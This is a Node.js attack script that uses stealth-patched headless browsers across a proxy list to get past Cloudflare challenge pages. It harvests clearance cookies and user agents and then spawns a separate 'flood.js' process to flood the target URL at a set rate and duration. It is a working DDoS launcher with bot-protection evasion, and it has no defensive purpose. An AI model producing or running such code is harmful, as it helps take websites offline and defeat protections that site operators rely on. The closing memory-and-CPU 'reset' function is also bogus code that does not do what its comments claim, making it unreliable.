const errorHandler = error => {
  // console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
  const index = this.indexOf(item);
  if (index !== -1) {
    this.splice(index, 1);
  }
  return item;
}
const COOKIES_MAX_RETRIES = 1;
const async = require("async");
const fs = require("fs");
const os = require('os');
const puppeteer = require("puppeteer-extra");
const puppeteerStealth = require("puppeteer-extra-plugin-stealth");
process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;
const stealthPlugin = puppeteerStealth();
puppeteer.use(stealthPlugin);
const targetURL = process.argv[2];
const threads = +process.argv[3];
const proxiesCount = process.argv[4];
const proxyFile = process.argv[5];
const rates = process.argv[6];
const duration = process.argv[7];
const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
const { spawn } = require("child_process");
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randList = list => list[Math.floor(Math.random() * list.length)];
const proxies = readLines(proxyFile);

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0,gzip(gfe)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
];

const colors = {
  COLOR_BLUE: "\x1b[34m",
  COLOR_RESET: "\x1b[0m"
};
function colored(colorCode, text) {
  console.log(colorCode + text + colors.COLOR_RESET);
};
async function detectChallenge(browserProxy, page) {
  const title = await page.title();
  const content = await page.content();
  if (title === "Attention Required! | Cloudflare") {
    throw new Error("Proxy blocked");
  }
  if (content.includes("challenge-platform") === true) {
    colored(colors.COLOR_BLUE, "[BrowserStart] Wait for the captcha!!!" + browserProxy);
    try {
      await sleep(25);
      const captchaContainer = await page.$("iframe[src*='challenges']");
      await captchaContainer.click({
        offset: {
          x: 20,
          y: 20
        }
      });
    } finally {
      await sleep(15);
      return;
    }
  }
  colored(colors.COLOR_BLUE, "[BrowserStart] Error not found captcha " + browserProxy);
  await sleep(35);
  return;
}
async function openBrowser(targetURL, browserProxy) {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      const promise = async (resolve, reject) => {
      const options = {
      headless: "new",
      ignoreHTTPSErrors: true,
      args: [
        "--proxy-server=http://" + browserProxy,
        "--no-sandbox",
        "--no-first-run",
        "--ignore-certificate-errors",
        "--disable-extensions",
        "--test-type",
        "--user-agent= + userAgent"
      ]
    };
    

    const browser = await puppeteer.launch(options);
    try {
      colored(colors.COLOR_BLUE, "[BrowserStart] Started browser " + browserProxy);
      const [page] = await browser.pages();
      const client = page._client();
      page.on("framenavigated", (frame) => {
        if (frame.url().includes("challenges.cloudflare.com") === true) client.send("Target.detachFromTarget", { targetId: frame._id });
      });
      page.setDefaultNavigationTimeout(60 * 1000);
      const userAgent = await page.evaluate(function () {
        return navigator.userAgent;
      });
      await page.goto(targetURL, {
        waitUntil: "domcontentloaded"
      });
      await detectChallenge(browserProxy, page, reject);
      const title = await page.title();
      const cookies = await page.cookies(targetURL);
      resolve({
        title: title,
        browserProxy: browserProxy,
        cookies: cookies.map(cookie => cookie.name + "=" + cookie.value).join("; ").trim(),
        userAgent: userAgent
      });
    } catch (exception) {
      reject("[BrowserStart] Error cannot solve captcha " + browserProxy);
    } finally {
      colored(colors.COLOR_BLUE, "[BrowserStart] Closed browser " + browserProxy);
      await browser.close();
    }
  };
  return new Promise(promise);
}
async function startThread(targetURL, browserProxy, task, done, retries = 0) {
  if (retries === COOKIES_MAX_RETRIES) {
    const currentTask = queue.length();
    done(null, { task, currentTask });
  } else {
    try {
      const response = await openBrowser(targetURL, browserProxy);
      const cookies = "Title: " + response.title + " | " + response.browserProxy + " | " + response.userAgent + " | " + response.cookies;
      colored(colors.COLOR_BLUE, "[BrowserStart] " + cookies);
      spawn("node", [
        "flood.js",
        targetURL,
        duration,
        rates,
        "41",
        response.browserProxy,
        response.userAgent,
        response.cookies,
        'http'
      ]);
      await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
    } catch (exception) {
      colored(colors.COLOR_BLUE, exception);
      await startThread(targetURL, browserProxy, task, done, COOKIES_MAX_RETRIES);
    }
  }
}
var queue = async.queue(function (task, done) {
  startThread(targetURL, task.browserProxy, task, done);
}, threads);
async function __main__() {
  for (let i = 0; i < proxiesCount; i++) {
    const browserProxy = randList(proxies);
    proxies.remove(browserProxy);
    queue.push({ browserProxy: browserProxy });
  }
  const queueDrainHandler = () => { };
  queue.drain(queueDrainHandler);
}
__main__();
function checkAndResetRamAndCpu(){
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMemPercentage = ((totalMem - freeMem) / totalMem) * 100;
  
  if(usedMemPercentage >= 80){
      console.log('Memory usage is above 80%. Resetting...');

      // Reset CPU Usage
      const cpus = os.cpus();
      cpus.forEach(cpu => {
          cpu.times.user = 0;
          cpu.times.sys = 0;
          cpu.times.idle = 0;
          cpu.times.irq = 0;
      });

      // Allocate memory to reset the used memory
      const buffer = Buffer.alloc(freeMem);

      console.log('Memory and CPU usage reset successfully.');
  } else {
      console.log('Memory usage is below 80%. No action needed.');
  }
}

// Call the function to check and reset RAM and CPU if usage reaches 80%
checkAndResetRamAndCpu();
